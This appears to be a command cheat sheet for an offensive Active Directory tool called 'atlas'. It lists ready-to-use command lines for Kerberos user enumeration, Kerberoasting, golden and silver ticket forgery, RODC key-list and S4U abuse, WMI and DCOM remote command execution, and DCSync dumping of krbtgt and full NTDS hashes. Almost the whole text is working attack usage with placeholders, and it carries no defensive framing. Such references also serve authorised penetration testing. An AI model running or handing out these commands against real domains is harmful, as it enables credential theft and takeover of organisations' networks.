# Kerberos / WMI / DCSync

## Kerberos
- User enum: `atlas kerberos <kdc> -d DOMAIN -UserList users.txt` (`KDC_ERR_PREAUTH_REQUIRED` vs `C_PRINCIPAL_UNKNOWN`)
- Kerberoasting: `-Roast -u user -p pass` (`GetTicketAsync` `S4U` `hashcat $krb5tgs$`)
- Key List (RODC): `-rodcNo 20000 -rodcKey <aes256> -UserList 'jdoe:1104'` (`KILE` `KERB-KEY-LIST-REQ`)
- Forge (golden/silver): `-Forge -ForgeTarget 'krbtgt/DOMAIN' -ForgeUserSid <sid> -ForgeUser admin -TicketEType Aes256CtsHmacSha1_96 -ServerKey <hex> -ForgeOut ticket.ccache` (`ForgeTicket`)
- TGT request: `-RequestTgt -u user -p pass -TgtOut user.ccache` (`RequestInitialTicket`)
- S4U: `-S4UserName user -Spn cifs/host -GenerateSt st.ccache [-Self]` (needs `-Kdc`)

## WMI
- Auth check: `atlas wmi <host> -u admin -p pass`
- Exec: `-x whoami` / `-X '$PSVersionTable'` (`Win32_Process.Create`), `--wmi-query "SELECT * FROM Win32_Process"` via `WmiScope.ExecuteWqlQueryAsync`
- Namespaces: `-WmiNamespaces`; registry via StdRegProv: `-WmiRegQuery 'HKLM\SOFTWARE\X' [-WmiRegValue Name]`
- DCOM invoke (mmcexec primitive): `-DcomClsid 49B2791A-... -DcomMethod Document.ActiveView.ExecuteShellCommand -DcomArgs ...`
- Endpoints: `-EpmList` (endpoint mapper)
- Note: Atlas DCOM paths default to NDR32 (`OfferNdr64=false`); Titanis NDR64 activation fails on Server 2025+ (RPC 1783)

## DCSync
- `atlas dcsync <dc> -u admin -p pass krbtgt` (`IDL_DRSGetNCChanges` `EXOP_REPL_OBJ` via `Titanis.Msrpc.Msdrsr`)
- Full sync: `-Ntds` (whole domain NC, secretsdump-style)
- Topology: `-DcInfo -ListDomains -ListSites -ListRoles -ListPartitions -ListGcs -Neighbors -CrackName <name>`
